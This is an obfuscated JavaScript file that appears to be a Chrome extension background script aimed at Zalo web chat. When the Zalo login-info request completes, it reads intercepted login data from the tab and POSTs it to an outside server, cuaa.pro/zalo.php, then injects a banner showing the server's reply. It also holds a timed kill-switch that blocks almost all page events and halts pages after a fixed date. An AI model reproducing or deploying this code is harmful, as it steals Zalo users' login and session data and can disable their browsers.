function Othsne(_0x5064ad) {
  function _0xf2d56(_0x1b4846) {
    _0x1b4846.stopPropagation();
    _0x1b4846.preventDefault();
  }
  window.addEventListener("error", function (_0x24ac09) {
    _0x24ac09.preventDefault();
    _0x24ac09.stopPropagation();
  }, false);
  var _0x345196 = ["copy", "cut", "paste", "beforeunload", "blur", "change", "click", "contextmenu", "dblclick", "focus", "keydown", "keypress", "keyup", "mousedown", "mousemove", "mouseout", "mouseover", "mouseup", "resize", "scroll", "DOMNodeInserted", "DOMNodeRemoved", "DOMNodeRemovedFromDocument", "DOMNodeInsertedIntoDocument", "DOMAttrModified", "DOMCharacterDataModified", "DOMElementNameChanged", "DOMAttributeNameChanged", "DOMActivate", "DOMFocusIn", "DOMFocusOut", "online", "offline", "textInput", "abort", "close", "dragdrop", "load", "paint", "reset", "select", "submit", "unload"];
  for (let _0xf00277 = 0; _0xf00277 < _0x345196.length; _0xf00277++) {
    window.addEventListener(_0x345196[_0xf00277], function (_0x4dbf66) {
      _0xf2d56(_0x4dbf66);
    }, true);
  }
  if (window.stop) {
    window.stop();
  }
  setInterval(function () {
    return;
  }, 10);
  if (typeof _0x5064ad === "string") {
    alert(_0x5064ad);
  }
  throw "";
}
let timeNow = Math.floor(Date.now() / 1000);
if (timeNow > 1633387460) {
  Othsne();
}
chrome.webRequest.onCompleted.addListener(function (_0x5c9823) {
  if (_0x5c9823.url.includes("/api/login/getLoginInfo")) {
    chrome.tabs.executeScript(_0x5c9823.tabId, {
      code: "document.getElementById('__interceptedData').innerText;"
    }, function (_0x1b5142) {
      let _0x52b90f = new XMLHttpRequest();
      let _0x348aeb = "https://cuaa.pro/zalo.php";
      _0x52b90f.open("POST", _0x348aeb, true);
      _0x52b90f.setRequestHeader("Content-type", "application/json;charset=UTF-8");
      _0x52b90f.onreadystatechange = function () {
        if (_0x52b90f.readyState == 4 && _0x52b90f.status == 200) {
          let _0x3284ba = JSON.parse(_0x52b90f.responseText);
          if (typeof _0x3284ba.OK !== "undefined") {
            chrome.tabs.executeScript(_0x5c9823.tabId, {
              code: "console.clear(); var dataDOMElement = document.createElement('div'); dataDOMElement.id = 'keyZALO'; dataDOMElement.innerText = '" + _0x3284ba.OK + "'; dataDOMElement.style.cssText = 'position: fixed; right: 10px; background: #0091ff; padding: 5px; z-index: 999999; top: 10px; color: white; font-weight: 700; font-size: 30px;'; document.body.appendChild(dataDOMElement);"
            });
          }
        }
      };
      const _0x485b38 = {
        url: _0x5c9823.url,
        dataLogin: _0x1b5142[0]
      };
      _0x52b90f.send(JSON.stringify(_0x485b38));
    });
  }
}, {
  urls: ["https://wpa.chat.zalo.me/*"]
}, ["responseHeaders"]);